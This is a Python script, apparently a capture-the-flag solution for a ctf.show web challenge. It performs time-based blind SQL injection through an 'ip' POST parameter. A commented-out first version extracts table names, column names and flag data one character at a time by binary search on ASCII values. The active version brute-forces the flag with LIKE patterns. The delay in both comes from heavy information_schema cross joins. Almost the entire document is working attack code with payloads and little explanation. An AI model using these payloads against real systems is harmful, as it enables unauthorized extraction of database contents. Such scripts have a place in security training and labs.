# import requests
# import time
# url='http://01a283bc-d5ae-4ee9-85bd-87b2f015fc33.challenge.ctf.show/api/index.php'
#
# flag=''
# for i in range(60):
#     lenth = len(flag)
#     min,max = 32,128
#     while True:
#         j = min + (max-min)//2
#         if(min == j):
#             flag += chr(j)
#             print(flag)
#             break
#
#         # payload=f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)"
#         # payload=f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxca'),{i},1))<{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)"
#         payload=f"if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxca),{i},1))<{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)"
#
#         data={
#             'ip':payload,
#             'debug':0
#         }
#         try:
#             r=requests.post(url=url,data=data,timeout=0.15)
#             min=j
#         except:
#             max=j
#         time.sleep(0.1)
import requests
import time
url='http://8900b499-51eb-4ac2-84f3-bad5155650d5.challenge.ctf.show//api/index.php'
table = '0123456789abcdef-{},_"'
flag='ctfshow{'
for i in range(60):
    for j in table:
        payload = "if((select flagaabcc from ctfshow_flagxcac limit 0,1) like '{}',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)".format(flag + j + "%")

        data={
            'ip':payload,
            'debug':0
        }
        try:
            r = requests.post(url=url, data=data, timeout=0.15)
        except:
            flag += j
            print(flag)
            break
        time.sleep(0.2)